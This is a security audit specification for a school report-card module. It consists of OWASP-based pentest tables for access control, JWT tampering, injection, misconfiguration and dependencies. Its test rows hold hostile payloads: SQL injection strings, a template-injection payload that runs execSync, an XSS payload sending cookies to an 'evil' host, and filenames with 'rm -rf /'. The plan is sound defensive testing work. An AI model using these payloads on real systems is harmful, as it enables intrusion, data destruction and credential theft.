# Report Cards Module — Security Audit Specification

**Module:** Report Cards (`apps/api/src/modules/report-cards/`)
**Scope:** 14 tenant-scoped tables, 85+ REST endpoints, 11 permissions, 1 public verification endpoint, S3 integration, AI integration, Puppeteer PDF rendering, bulk delivery (email / SMS / WhatsApp), CSV/JSON imports.
**Methodology:** OWASP ASVS Level 2 + OWASP Top 10 (2021) + STRIDE + business-logic abuse + injection fuzzing + permission matrix.
**Audience:** External pentest firm OR internal security engineer.
**Release gate:** All P0 findings must be closed. All P1 findings must be closed before onboarding the first paying tenant.

---

## Part 0 — Purpose & How to Execute

### 0.1 — Why this spec exists

The Report Cards module is the only module in EduPod where:

1. User-generated content (teacher comments, tenant branding, student names, principal signatures) is rendered into **PDF documents via Puppeteer** — a full headless browser that historically has been a vector for RCE, SSRF, and file-disclosure attacks.
2. A **public unauthenticated endpoint** (`GET /v1/verify/:token`) returns tenant-scoped data (student name, grade snapshot, issue date, principal signature) to anyone who holds the token.
3. **Immutable snapshots** of grades are created and persisted — integrity of these snapshots is a legal artefact for academic records.
4. **Cross-tenant risk** is inherent because verification tokens are globally scanned — a weak implementation could leak across tenants.

### 0.2 — Who should execute this

Preferred: an external penetration-testing firm with at least one consultant holding OSCP or CREST. Alternative: internal security engineer under dual-review with another engineer not on the Report Cards feature team.

### 0.3 — Test environment

Staging only. Never production. The staging DB must be seeded with two synthetic tenants (`tenant_a`, `tenant_b`) each with a full cohort. Staging S3 bucket must be isolated from production.

### 0.4 — Severity ladder

| Sev | Meaning                                     | Timeline                       |
| --- | ------------------------------------------- | ------------------------------ |
| P0  | Blocks release; data leak, auth bypass, RCE | Fix before any further release |
| P1  | Must fix before first paying tenant         | ≤ 2 weeks                      |
| P2  | Fix in next sprint                          | ≤ 6 weeks                      |
| P3  | Backlog; document risk                      | ≤ 6 months                     |

### 0.5 — Row format for every test below

`| # | Test Name | Payload / Scenario | Expected Result | Severity | Pass/Fail |`

Leave the `Severity` column blank if the test passes; fill with P0–P3 if it fails. `Pass/Fail` filled during execution.

---

## Part 1 — OWASP Top 10 (2021) Coverage

### Section 1 — OWASP A01: Broken Access Control

#### 1.1 Vertical privilege escalation (role boundaries)

| #      | Test Name                                                           | Payload / Scenario                                                                                        | Expected Result         | Severity | Pass/Fail |
| ------ | ------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------- | ----------------------- | -------- | --------- |
| 1.1.1  | Teacher calls admin-only publish endpoint                           | Teacher JWT → POST `/v1/report-cards/runs/:id/publish`                                                    | 403 `PERMISSION_DENIED` |          |           |
| 1.1.2  | Teacher calls approval-config create                                | Teacher JWT → POST `/v1/report-cards/approval-configs`                                                    | 403                     |          |           |
| 1.1.3  | Teacher generates a cross-class run                                 | Teacher JWT → POST `/v1/report-cards/runs` with class_ids outside their assignment                        | 403                     |          |           |
| 1.1.4  | Parent calls teacher comment endpoint                               | Parent JWT → POST `/v1/report-cards/:id/comments`                                                         | 403                     |          |           |
| 1.1.5  | Parent calls admin finalise                                         | Parent JWT → POST `/v1/report-cards/runs/:id/finalise`                                                    | 403                     |          |           |
| 1.1.6  | Student calls comment edit                                          | Student JWT → PATCH `/v1/report-cards/comments/:id`                                                       | 403                     |          |           |
| 1.1.7  | Vice-principal calls template delete                                | VP JWT without `templates.delete` perm → DELETE `/v1/report-cards/templates/:id`                          | 403                     |          |           |
| 1.1.8  | Teacher calls teacher-request auto-approve for someone else's class | Teacher A JWT → POST `/v1/report-cards/teacher-requests/:id/approve` where request was filed by Teacher B | 403                     |          |           |
| 1.1.9  | Teacher calls principal signature upload                            | Teacher JWT → POST `/v1/report-cards/branding/signature`                                                  | 403                     |          |           |
| 1.1.10 | Anonymous calls any authenticated endpoint                          | No JWT → GET `/v1/report-cards/runs`                                                                      | 401                     |          |           |

#### 1.2 Horizontal privilege escalation (same role, different resource)

| #     | Test Name                                       | Payload / Scenario                                                                            | Expected Result                        | Severity | Pass/Fail |
| ----- | ----------------------------------------------- | --------------------------------------------------------------------------------------------- | -------------------------------------- | -------- | --------- |
| 1.2.1 | Teacher A edits Teacher B's comment             | Teacher A JWT → PATCH `/v1/report-cards/comments/:id_from_teacher_b`                          | 403                                    |          |           |
| 1.2.2 | Parent A acknowledges Parent B's card           | Parent A JWT → POST `/v1/report-cards/:id/acknowledge` where card belongs to Parent B's child | 403                                    |          |           |
| 1.2.3 | Student A views Student B's card                | Student A JWT → GET `/v1/report-cards/:id_of_student_b`                                       | 404 (not 403 — avoids existence probe) |          |           |
| 1.2.4 | Teacher A submits comment for Teacher B's class | Teacher A JWT → POST `/v1/report-cards/:id/comments` on card in Teacher B's class             | 403                                    |          |           |
| 1.2.5 | Principal A finalises Principal B's run         | Principal from School A JWT → POST `/v1/report-cards/runs/:b_run/finalise`                    | 403                                    |          |           |
| 1.2.6 | Parent A downloads Parent B's PDF               | Parent A JWT → GET `/v1/report-cards/:id/pdf` on card in another household                    | 404                                    |          |           |

#### 1.3 Multi-tenant isolation (RLS enforcement)

| #      | Test Name                                                               | Payload / Scenario                                                                                          | Expected Result                          | Severity | Pass/Fail |
| ------ | ----------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------- | ---------------------------------------- | -------- | --------- |
| 1.3.1  | Tenant B reads Tenant A run                                             | Tenant B admin JWT → GET `/v1/report-cards/runs/:a_run_id`                                                  | 404 (not 403 — prevents existence probe) |          |           |
| 1.3.2  | Tenant B patches Tenant A template                                      | Tenant B admin JWT → PATCH `/v1/report-cards/templates/:a_template_id`                                      | 404                                      |          |           |
| 1.3.3  | Tenant B publishes Tenant A run                                         | Tenant B admin JWT → POST `/v1/report-cards/runs/:a_run_id/publish`                                         | 404                                      |          |           |
| 1.3.4  | Tenant B deletes Tenant A comment                                       | Tenant B admin JWT → DELETE `/v1/report-cards/comments/:a_comment_id`                                       | 404                                      |          |           |
| 1.3.5  | SQL-direct probe of report_cards for tenant A while B's RLS context set | Run `SELECT * FROM report_cards WHERE id = :a_id` inside `SET LOCAL app.current_tenant_id = tenant_b`       | 0 rows                                   |          |           |
| 1.3.6  | SQL-direct UPDATE of Tenant A row while Tenant B context                | `UPDATE report_cards SET status='published' WHERE id=:a_id` inside tenant_b RLS                             | 0 rows affected                          |          |           |
| 1.3.7  | Tenant B attempts to reference Tenant A template in new run             | Tenant B admin → POST `/v1/report-cards/runs` with `template_id` from Tenant A                              | 404 `TEMPLATE_NOT_FOUND`                 |          |           |
| 1.3.8  | Tenant B clones Tenant A template                                       | Tenant B admin → POST `/v1/report-cards/templates/:a_template_id/clone`                                     | 404                                      |          |           |
| 1.3.9  | Cross-tenant revise chain                                               | Tenant B admin → POST `/v1/report-cards/:b_card/revise` with `revision_of_report_card_id` = Tenant A's card | 400 / 404 (never cross-link)             |          |           |
| 1.3.10 | Tenant B subscribes to Tenant A's delivery channel                      | Tenant B admin → POST `/v1/report-cards/delivery-channels` referencing Tenant A's channel_config_id         | 404                                      |          |           |

#### 1.4 Forced browsing & IDOR

| #     | Test Name                     | Payload / Scenario                                                   | Expected Result                          | Severity | Pass/Fail |
| ----- | ----------------------------- | -------------------------------------------------------------------- | ---------------------------------------- | -------- | --------- |
| 1.4.1 | Enumerate report-card IDs     | Guess UUIDs sequentially against `/v1/report-cards/:id/pdf`          | All return 404 without leaking existence |          |           |
| 1.4.2 | Enumerate approval config IDs | Guess against `/v1/report-cards/approval-configs/:id`                | 404 uniformly                            |          |           |
| 1.4.3 | Enumerate comments            | Guess against `/v1/report-cards/comments/:id`                        | 404 uniformly                            |          |           |
| 1.4.4 | Enumerate runs                | Guess against `/v1/report-cards/runs/:id`                            | 404 uniformly                            |          |           |
| 1.4.5 | Enumerate templates           | Guess against `/v1/report-cards/templates/:id`                       | 404 uniformly                            |          |           |
| 1.4.6 | Timing attack on 404s         | Compare response times for existing-but-wrong-tenant vs non-existent | Δ < 50ms (no timing side-channel)        |          |           |

#### 1.5 JWT tampering

| #     | Test Name                            | Payload / Scenario                                                 | Expected Result          | Severity | Pass/Fail |
| ----- | ------------------------------------ | ------------------------------------------------------------------ | ------------------------ | -------- | --------- |
| 1.5.1 | Change role claim teacher → admin    | Decode JWT, change `role: "admin"`, re-encode, send                | 401 (signature mismatch) |          |           |
| 1.5.2 | Change tenant_id claim               | Decode JWT, swap tenant_id to tenant_b's, resign with attacker key | 401                      |          |           |
| 1.5.3 | `alg: none` attack                   | Set JWT header `{alg:"none"}`, drop signature                      | 401                      |          |           |
| 1.5.4 | Algorithm confusion HS256 ↔ RS256    | Sign HS256 payload with the public key as the HMAC secret          | 401                      |          |           |
| 1.5.5 | Expired JWT                          | Send JWT with `exp` 1 hour in past                                 | 401 `TOKEN_EXPIRED`      |          |           |
| 1.5.6 | JWT with future `nbf`                | Send JWT with `nbf` 1 hour in future                               | 401                      |          |           |
| 1.5.7 | Kid path traversal                   | Set `kid: "../../../../dev/null"` in header                        | 401, not file read       |          |           |
| 1.5.8 | Duplicate claim with different value | Craft JWT where `role` appears twice                               | 401                      |          |           |

#### 1.6 Public verification endpoint (`/v1/verify/:token`)

| #     | Test Name                                | Payload / Scenario                                                              | Expected Result                                                     | Severity | Pass/Fail |
| ----- | ---------------------------------------- | ------------------------------------------------------------------------------- | ------------------------------------------------------------------- | -------- | --------- |
| 1.6.1 | Does tenant resolve from token lookup?   | Verify a Tenant A token — check server logs for correct tenant scoping          | Response data ONLY from Tenant A; RLS context was set               |          |           |
| 1.6.2 | Can Tenant A token verify Tenant B card? | Forge scenario: Tenant A issues token → modified to point at Tenant B card UUID | Rejected; token is the primary key, not card+tenant                 |          |           |
| 1.6.3 | Token pointing at deleted card           | Delete card → use old token                                                     | 404 `REPORT_CARD_NOT_FOUND`                                         |          |           |
| 1.6.4 | Token from unpublished draft             | Generate token on draft card → verify it                                        | 404 (token only issued on publish)                                  |          |           |
| 1.6.5 | Token enumeration rate limit             | 10,000 sequential `/verify/:rand_uuid` requests from single IP                  | Rate-limited after threshold (≥429 on excess)                       |          |           |
| 1.6.6 | Response leaks other tenant data         | Verify Tenant A card — inspect JSON for any Tenant B fields                     | No cross-tenant field leakage                                       |          |           |
| 1.6.7 | CORS on verify endpoint                  | Request from arbitrary origin `https://evil.com`                                | CORS headers restrict OR endpoint is deliberately public — document |          |           |

#### 1.7 Acknowledgment endpoint IDOR (suspected design flaw)

| #     | Test Name                               | Payload / Scenario                                                                                | Expected Result                                            | Severity                   | Pass/Fail |
| ----- | --------------------------------------- | ------------------------------------------------------------------------------------------------- | ---------------------------------------------------------- | -------------------------- | --------- |
| 1.7.1 | Acknowledge on behalf of another parent | Parent A JWT → POST `/v1/report-cards/:id/acknowledge` with body `{ parent_id: "parent_b_uuid" }` | Server MUST ignore body `parent_id` and derive from JWT    | **P0** if server uses body |           |
| 1.7.2 | Acknowledge with missing parent_id      | Parent A JWT → body `{}`                                                                          | Server derives parent_id from JWT and succeeds             |                            |           |
| 1.7.3 | Acknowledge with student_id instead     | Parent A JWT → body `{ student_id: "..." }`                                                       | 400 — irrelevant field ignored                             |                            |           |
| 1.7.4 | Admin acknowledges as parent            | Admin JWT → POST `/v1/report-cards/:id/acknowledge`                                               | 403 (only parent role may acknowledge)                     |                            |           |
| 1.7.5 | Acknowledge idempotency                 | Same parent acknowledges twice                                                                    | Second call 200 with existing timestamp, not duplicate row |                            |           |

---

### Section 2 — OWASP A02: Cryptographic Failures

| #    | Test Name                                   | Payload / Scenario                                                   | Expected Result                                                           | Severity         | Pass/Fail |
| ---- | ------------------------------------------- | -------------------------------------------------------------------- | ------------------------------------------------------------------------- | ---------------- | --------- |
| 2.1  | Principal signature at rest in S3           | Inspect S3 object metadata — check `x-amz-server-side-encryption`    | SSE-S3 or SSE-KMS enabled; NOT plaintext                                  |                  |           |
| 2.2  | S3 bucket default-encryption policy         | AWS CLI `get-bucket-encryption`                                      | Returns AES256 or KMS                                                     |                  |           |
| 2.3  | S3 bucket public access block               | AWS CLI `get-public-access-block`                                    | All four flags TRUE                                                       |                  |           |
| 2.4  | Snapshot payload JSON plaintext in Postgres | `SELECT snapshot_payload_json FROM report_cards LIMIT 1` as DB admin | Plaintext (grades) — accepted if tenant contract permits; document in DPA | P2 if DPA silent |           |
| 2.5  | Verification token entropy                  | Decode 1,000 tokens — run ent / chi-square                           | ≥128-bit crypto-random (UUIDv4 or cryptoRandomBytes(16))                  |                  |           |
| 2.6  | Verification token predictability           | Sequential tokens issued 1s apart — look for timestamp embed         | No timestamp / counter leakage                                            |                  |           |
| 2.7  | JWT signing algorithm                       | Inspect JWT header                                                   | HS256 with 256-bit secret, or RS256 with 2048+ key                        |                  |           |
| 2.8  | JWT secret in repo                          | Grep repo for `JWT_SECRET=`                                          | Never hardcoded; only in env                                              |                  |           |
| 2.9  | TLS enforcement                             | Curl `http://` (not https)                                           | 301 → https                                                               |                  |           |
| 2.10 | HSTS header                                 | Inspect response headers                                             | `Strict-Transport-Security: max-age≥31536000; includeSubDomains`          |                  |           |
| 2.11 | TLS version                                 | `nmap --script ssl-enum-ciphers`                                     | TLS 1.2+, no TLS 1.0/1.1, no RC4, no 3DES                                 |                  |           |
| 2.12 | PDF encryption at rest in S3                | Check published-card PDFs in S3                                      | Encrypted bucket-side                                                     |                  |           |
| 2.13 | Encrypted column inventory                  | Grep Prisma schema for `@@encrypted` or known crypto fields          | Document which report-cards columns, if any, are app-layer encrypted      |                  |           |
| 2.14 | Pre-signed URL lifetime                     | Generate a download URL — inspect `X-Amz-Expires`                    | ≤ 900s (15 min)                                                           |                  |           |
| 2.15 | Signature image pre-signed URL scope        | Inspect URL                                                          | Restricted to single object, not bucket list                              |                  |           |
| 2.16 | Salt + pepper for any hashing?              | N/A for module — document                                            | —                                                                         |                  |           |

---

### Section 3 — OWASP A03: Injection

#### 3.1 SQL injection (Prisma + Zod are primary defence)

| #      | Test Name                             | Payload / Scenario                                                             | Expected Result                                  | Severity | Pass/Fail |
| ------ | ------------------------------------- | ------------------------------------------------------------------------------ | ------------------------------------------------ | -------- | --------- |
| 3.1.1  | SQLi in runs list search              | GET `/v1/report-cards/runs?q=';DROP TABLE report_cards;--`                     | 400 Zod rejection or literal search; no DB error |          |           |
| 3.1.2  | SQLi in comment search                | GET `/v1/report-cards/comments?q=' OR 1=1--`                                   | 400 or literal match                             |          |           |
| 3.1.3  | SQLi in template name                 | POST `/v1/report-cards/templates` with `name: "x'; DROP TABLE templates;--"`   | Stored as literal string; DB intact              |          |           |
| 3.1.4  | SQLi in UUID filter                   | GET `/v1/report-cards/runs?template_id=abc' OR '1'='1`                         | 400 (UUID validation)                            |          |           |
| 3.1.5  | SQLi via order-by                     | GET `/v1/report-cards/runs?sort=created_at;DROP...`                            | 400 (allow-list only)                            |          |           |
| 3.1.6  | SQLi in custom field value            | PATCH `/v1/report-cards/:id` with `custom_field_values: {"note": "'; DROP--"}` | Stored literal                                   |          |           |
| 3.1.7  | SQLi via raw query                    | No `$executeRawUnsafe` in module code                                          | Lint rule enforces                               |          |           |
| 3.1.8  | Stacked query                         | `?q=foo';DELETE FROM users;--`                                                 | Parameterised; no effect                         |          |           |
| 3.1.9  | UNION-based injection on report_cards | Inject `UNION SELECT password FROM users--`                                    | 400 or literal text                              |          |           |
| 3.1.10 | Blind boolean injection timing        | `q=x' AND (SELECT pg_sleep(5))--`                                              | No delay — param bound                           |          |           |

#### 3.2 JSON / NoSQL-style injection (JSONB fields)

| #      | Test Name                               | Payload / Scenario                                     | Expected Result                                  | Severity | Pass/Fail |
| ------ | --------------------------------------- | ------------------------------------------------------ | ------------------------------------------------ | -------- | --------- |
| 3.2.1  | sections_json with operator keys        | `{"$ne": null, "sections": [...]}`                     | Zod rejects unknown keys via `.strict()`         |          |           |
| 3.2.2  | target_scope_json with cross-tenant IDs | `{"class_ids": ["<tenant_a_class_id>"]}` from tenant B | 400 `SCOPE_CROSS_TENANT`                         |          |           |
| 3.2.3  | snapshot_payload_json overwrite         | PATCH with crafted JSON containing admin-only keys     | Snapshot is immutable; 400                       |          |           |
| 3.2.4  | Deeply nested JSON (DoS)                | 10,000 nested levels in sections_json                  | Rejected — depth limit in Zod or body size limit |          |           |
| 3.2.5  | Large JSON payload                      | 100MB sections_json                                    | 413 Payload Too Large                            |          |           |
| 3.2.6  | JSON with **proto** pollution           | `{"__proto__": {"isAdmin": true}}`                     | Zod strips; Object.prototype unaffected          |          |           |
| 3.2.7  | JSON with constructor key               | `{"constructor": {"prototype": {...}}}`                | Same — stripped                                  |          |           |
| 3.2.8  | Invalid UTF-8 in JSON                   | Binary bytes inside string field                       | 400 parser error                                 |          |           |
| 3.2.9  | Duplicate keys in JSON                  | `{"a": 1, "a": 2}`                                     | Last-wins behaviour documented; no crash         |          |           |
| 3.2.10 | JSON with BigInt marker                 | `{"grade": 1n}`                                        | 400 (JSON.parse rejects)                         |          |           |

#### 3.3 OS command injection (Puppeteer / image endpoint)

| #     | Test Name                               | Payload / Scenario                                   | Expected Result                         | Severity | Pass/Fail |
| ----- | --------------------------------------- | ---------------------------------------------------- | --------------------------------------- | -------- | --------- |
| 3.3.1 | Filename with shell metacharacters      | Upload `sig.png; rm -rf /.png` to signature endpoint | Filename sanitised / rejected           |          |           |
| 3.3.2 | Filename with null byte                 | `sig.png\x00.exe`                                    | Rejected                                |          |           |
| 3.3.3 | Filename with backtick command          | `` `whoami`.png ``                                   | Stored literal; no exec                 |          |           |
| 3.3.4 | Template-from-image with semicolon path | `template;reboot.jpg`                                | Sanitised                               |          |           |
| 3.3.5 | Puppeteer args from env                 | Inspect Puppeteer launch config                      | No user-controlled `--args=`            |          |           |
| 3.3.6 | PDF filename in Content-Disposition     | Student name with `"; rm -rf /`                      | Header-injection-safe (quoted, escaped) |          |           |

#### 3.4 Template / SSTI injection (Handlebars / Mustache in sections_json)

| #     | Test Name                       | Payload / Scenario                                                                                            | Expected Result                 | Severity           | Pass/Fail |
| ----- | ------------------------------- | ------------------------------------------------------------------------------------------------------------- | ------------------------------- | ------------------ | --------- |
| 3.4.1 | SSTI via comment text           | Comment: `{{constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}}` | Rendered as literal text in PDF | **P0** if executed |           |
| 3.4.2 | SSTI via template section title | Section title: `{{#each process.env}}{{@key}}={{this}}{{/each}}`                                              | Literal; no env leak            |                    |           |
| 3.4.3 | Handlebars helper override      | Upload template with `{{#helperMissing}}`                                                                     | Unsafe helpers disabled         |                    |           |
| 3.4.4 | Mustache with triple-brace      | `{{{payload}}}` with `<script>`                                                                               | Auto-escaped to HTML entities   |                    |           |
| 3.4.5 | ERB / Jinja syntax              | `<%= 7*7 %>` and `{% ... %}`                                                                                  | Literal                         |                    |           |
| 3.4.6 | Expression language             | `${7*7}`                                                                                                      | Literal                         |                    |           |
| 3.4.7 | Large template expansion        | Template with 1e6 iteration loop                                                                              | Rejected by renderer timeout    |                    |           |

#### 3.5 XSS / HTML injection

| #      | Test Name                             | Payload / Scenario                                                    | Expected Result                                                                        | Severity           | Pass/Fail |
| ------ | ------------------------------------- | --------------------------------------------------------------------- | -------------------------------------------------------------------------------------- | ------------------ | --------- |
| 3.5.1  | Script tag in comment                 | Comment: `<script>alert(1)</script>`                                  | Rendered escaped in PDF AND in web UI                                                  |                    |           |
| 3.5.2  | Image onerror in comment              | `<img src=x onerror=alert(1)>`                                        | Escaped                                                                                |                    |           |
| 3.5.3  | javascript: URL in template link      | `<a href="javascript:alert(1)">` in sections                          | `href` rewritten or stripped                                                           |                    |           |
| 3.5.4  | SVG script payload                    | Upload SVG signature with `<script>`                                  | Converted to raster OR script stripped                                                 |                    |           |
| 3.5.5  | CSS expression                        | `style="expression(alert(1))"`                                        | Stripped                                                                               |                    |           |
| 3.5.6  | Unicode bypass `<scr\x00ipt>`         | In comment                                                            | Escaped                                                                                |                    |           |
| 3.5.7  | HTML entities bypass `&lt;script&gt;` | In comment                                                            | Rendered literally (double-encoded)                                                    |                    |           |
| 3.5.8  | XSS in verification viewer            | Student name: `"><script>fetch('//evil?c='+document.cookie)</script>` | HTML-escaped on `/verify/:token` render                                                | **P0** if executed |           |
| 3.5.9  | XSS in published PDF via Puppeteer    | Comment with script — does Puppeteer execute before print?            | Puppeteer runs in sandbox mode with JS disabled for content pages; script NOT executed | **P0** if exec     |           |
| 3.5.10 | XSS via MathML / foreignObject        | `<math><mtext></p></p><iframe src=...>`                               | Sanitised                                                                              |                    |           |

#### 3.6 Header injection / CRLF

| #     | Test Name                                  | Payload / Scenario                      | Expected Result | Severity | Pass/Fail |
| ----- | ------------------------------------------ | --------------------------------------- | --------------- | -------- | --------- |
| 3.6.1 | CRLF in student name → Content-Disposition | Name: `foo\r\nX-Injected: bar`          | Header stripped |          |           |
| 3.6.2 | CRLF in delivery channel metadata          | `\r\n` in subject line                  | Rejected        |          |           |
| 3.6.3 | Response splitting via redirect            | Redirect param with `%0d%0aSet-Cookie:` | Encoded         |          |           |

---

### Section 4 — OWASP A04: Insecure Design

| #    | Test Name                             | Payload / Scenario                                                                         | Expected Result                                         | Severity       | Pass/Fail |
| ---- | ------------------------------------- | ------------------------------------------------------------------------------------------ | ------------------------------------------------------- | -------------- | --------- |
| 4.1  | Acknowledgment endpoint design        | Does it take parent_id from body OR JWT?                                                   | MUST be JWT. If body → P0.                              | **P0** if body |           |
| 4.2  | Teacher auto-approve rate limit       | Teacher submits 100 comments in 5 seconds                                                  | ≥429 after threshold; no runaway write                  |                |           |
| 4.3  | Snapshot immutability                 | Teacher or admin PATCH `snapshot_payload_json` directly                                    | 400 — snapshot is append-only                           |                |           |
| 4.4  | Comment window reopen audit           | Admin reopens closed comment window                                                        | Audit log row created with before/after timestamps      |                |           |
| 4.5  | Comment window reopen limit           | Admin reopens > 3 times                                                                    | Warning / escalation                                    |                |           |
| 4.6  | Revise chain cross-tenant             | `revision_of_report_card_id` references Tenant A card while Tenant B context               | 400 `CROSS_TENANT_REVISION`                             |                |           |
| 4.7  | Revise chain depth                    | Revise a revision of a revision (chain > 5)                                                | Warning or rejection                                    |                |           |
| 4.8  | Approval bypass via direct PATCH      | PATCH `/v1/report-cards/runs/:id` with `status: 'approved'` from JWT without approver perm | 403                                                     |                |           |
| 4.9  | Approval bypass via DB mutation       | Direct UPDATE on `report_card_runs.status = 'approved'`                                    | RLS denies unless tenant context + if raw SQL elsewhere |                |           |
| 4.10 | Bulk generate DoS                     | POST `/v1/report-cards/runs` with 100,000 scope IDs                                        | 400 (size limit) or queued with rate-limit per tenant   |                |           |
| 4.11 | Workflow state skipping               | Draft → Published without In-Review                                                        | Rejected by state machine                               |                |           |
| 4.12 | Delete published card                 | DELETE `/v1/report-cards/:id` on `status=published`                                        | 409 `CANNOT_DELETE_PUBLISHED` (only archive allowed)    |                |           |
| 4.13 | Delivery re-send abuse                | Re-send same card 1,000 times                                                              | Rate-limited; dedupe per channel+recipient              |                |           |
| 4.14 | Parent enrols in wrong child          | Parent impersonates another parent — already covered in 1.7; design-level check            | Only linked-household pairings visible                  |                |           |
| 4.15 | PDF generation of unreleased snapshot | Generate PDF before approval                                                               | Refused unless status >= approved                       |                |           |

---

### Section 5 — OWASP A05: Security Misconfiguration

| #    | Test Name                          | Payload / Scenario                                              | Expected Result                                                                                    | Severity                                        | Pass/Fail |
| ---- | ---------------------------------- | --------------------------------------------------------------- | -------------------------------------------------------------------------------------------------- | ----------------------------------------------- | --------- |
| 5.1  | CORS on /verify                    | Origin `https://evil.com` → check `Access-Control-Allow-Origin` | `*` (deliberate for public verify) OR restricted — document choice                                 | P2 if accidentally permissive on auth endpoints |           |
| 5.2  | CORS on authenticated endpoints    | Origin `https://evil.com` → `/v1/report-cards/runs`             | Reflected only for allow-listed origins                                                            |                                                 |           |
| 5.3  | CSP on verification viewer         | Inspect response                                                | `Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'` |                                                 |           |
| 5.4  | X-Content-Type-Options             | All responses                                                   | `nosniff`                                                                                          |                                                 |           |
| 5.5  | X-Frame-Options / frame-ancestors  | On /verify page                                                 | `DENY` or CSP `frame-ancestors 'none'`                                                             |                                                 |           |
| 5.6  | Referrer-Policy                    | All responses                                                   | `no-referrer` or `strict-origin-when-cross-origin`                                                 |                                                 |           |
| 5.7  | Permissions-Policy                 | All responses                                                   | camera=(), microphone=(), geolocation=()                                                           |                                                 |           |
| 5.8  | Rate limit on login                | 100 failed logins in 1 min                                      | ≥429 + temporary lockout (not module-specific but relevant)                                        |                                                 |           |
| 5.9  | Error responses do not leak stack  | Force a 500 on any endpoint                                     | Body: `{code, message}`, no stack, no SQL                                                          |                                                 |           |
| 5.10 | Error responses do not leak schema | 400 on invalid type                                             | Generic; no column names                                                                           |                                                 |           |
| 5.11 | Debug endpoints not in prod        | `GET /debug`, `/admin`, `/internal` on prod                     | 404                                                                                                |                                                 |           |
| 5.12 | Swagger / OpenAPI exposure         | `/api/docs` on prod                                             | 404 or authenticated                                                                               |                                                 |           |
| 5.13 | GraphQL introspection              | N/A — REST only                                                 | —                                                                                                  |                                                 |           |
| 5.14 | .env file exposure                 | `GET /.env` on prod                                             | 404                                                                                                |                                                 |           |
| 5.15 | Source map exposure                | `/_next/static/*.js.map` on prod                                | Not served OR requires staging only                                                                |                                                 |           |
| 5.16 | Default admin creds                | Try `admin/admin`, `admin/password`                             | Rejected                                                                                           |                                                 |           |
| 5.17 | Verbose logging in production      | Check log level                                                 | `info` or higher; no `debug`                                                                       |                                                 |           |
| 5.18 | S3 bucket ACL                      | Verify bucket is not public-read                                | Private                                                                                            |                                                 |           |
| 5.19 | S3 bucket versioning               | Versioning on for audit                                         | Enabled                                                                                            |                                                 |           |
| 5.20 | Node production mode               | `NODE_ENV=production`                                           | Set                                                                                                |                                                 |           |

---

### Section 6 — OWASP A06: Vulnerable & Outdated Components

| #    | Test Name                | Payload / Scenario                   | Expected Result                | Severity | Pass/Fail |
| ---- | ------------------------ | ------------------------------------ | ------------------------------ | -------- | --------- |
| 6.1  | Puppeteer version        | `npm ls puppeteer`                   | ≥ 21.x; no known RCE CVEs      |          |           |
| 6.2  | Puppeteer Chrome channel | Inspect installed Chrome version     | ≥ 120; patched for CVE-2024-\* |          |           |
| 6.3  | Prisma version           | `npm ls @prisma/client`              | ≥ 5.x; no known CVEs           |          |           |
| 6.4  | pdf-lib / pdfkit         | If used, version check               | Latest                         |          |           |
| 6.5  | Sharp (image proc)       | Version check                        | ≥ 0.33                         |          |           |
| 6.6  | NestJS version           | Check                                | ≥ 10.x LTS                     |          |           |
| 6.7  | Next.js version          | Check                                | ≥ 14.x with patched versions   |          |           |
| 6.8  | BullMQ version           | Check                                | Latest stable                  |          |           |
| 6.9  | ioredis                  | Check                                | Latest                         |          |           |
| 6.10 | OpenSSL in Node runtime  | `node -p "process.versions.openssl"` | ≥ 3.0.x                        |          |           |
| 6.11 | `npm audit` severity     | Run `npm audit --production`         | Zero critical, zero high       |          |           |
| 6.12 | Snyk / dependabot        | Check CI config                      | Automated alerts on            |          |           |
| 6.13 | SBOM generation          | `syft` or `cyclonedx` output exists  | Generated in CI                |          |           |
| 6.14 | Docker base image age    | Check Dockerfile                     | ≤ 30 days old                  |          |           |

---

### Section 7 — OWASP A07: Identification & Authentication Failures

| #    | Test Name                            | Payload / Scenario                                                 | Expected Result                                                  | Severity | Pass/Fail |
| ---- | ------------------------------------ | ------------------------------------------------------------------ | ---------------------------------------------------------------- | -------- | --------- |
| 7.1  | Session fixation on role change      | Login as teacher → promote to admin → session continues            | Token reissued on role change                                    |          |           |
| 7.2  | Refresh token reuse                  | Use refresh token twice                                            | Rotation enforced — second use invalidates session               |          |           |
| 7.3  | Refresh token fixation               | Login → capture refresh → logout → replay                          | Rejected                                                         |          |           |
| 7.4  | MFA bypass on verify endpoint        | N/A (public) — document in threat model                            | —                                                                |          |           |
| 7.5  | Verification token as auth surrogate | Can `/verify/:token` be used to bypass MFA on authenticated flows? | No — read-only data, no action permitted                         |          |           |
| 7.6  | Token reuse after card deletion      | Delete card → reuse verification token                             | 404                                                              |          |           |
| 7.7  | Token reuse after card revision      | Revise card → old token used                                       | Old token 410 Gone OR points to prior revision (document policy) |          |           |
| 7.8  | Password reset token interaction     | N/A for this module                                                | —                                                                |          |           |
| 7.9  | Device binding                       | N/A for module                                                     | —                                                                |          |           |
| 7.10 | Concurrent session limit             | Login same user on 10 devices                                      | Allowed OR limited per policy; document                          |          |           |

---

### Section 8 — OWASP A08: Software & Data Integrity Failures

| #    | Test Name                              | Payload / Scenario                                                | Expected Result                                                   | Severity | Pass/Fail |
| ---- | -------------------------------------- | ----------------------------------------------------------------- | ----------------------------------------------------------------- | -------- | --------- |
| 8.1  | Auto-generate cron cross-tenant effect | Malicious tenant admin creates a scheduled run with massive scope | Per-tenant quota enforced; no cross-tenant spillover              |          |           |
| 8.2  | Template JSON unsafe JS                | Upload template with inline `<script>` used at render             | Rendered in sandboxed Puppeteer with JS disabled for user content |          |           |
| 8.3  | Signed URL tampering                   | Alter `X-Amz-Expires` in a pre-signed URL                         | Signature mismatch → 403                                          |          |           |
| 8.4  | Signed URL path traversal              | Alter object key to `../../other-tenant/file`                     | 403                                                               |          |           |
| 8.5  | CI/CD artefact integrity               | Docker image signed (cosign)                                      | Signature verified at deploy                                      |          |           |
| 8.6  | Dependency pinning                     | `package-lock.json` committed                                     | Yes                                                               |          |           |
| 8.7  | npm install --ignore-scripts in CI     | Check workflow                                                    | Enabled for untrusted paths                                       |          |           |
| 8.8  | Deserialisation attack                 | Upload JSON with prototype pollution (repeated from 3.2.6)        | Blocked by Zod                                                    |          |           |
| 8.9  | Auto-update of Puppeteer Chrome        | Inspect lockfile                                                  | Pinned; manually bumped                                           |          |           |
| 8.10 | Webhook verification (if any)          | If module has inbound webhooks, signature checked                 | HMAC verified or N/A                                              |          |           |

---

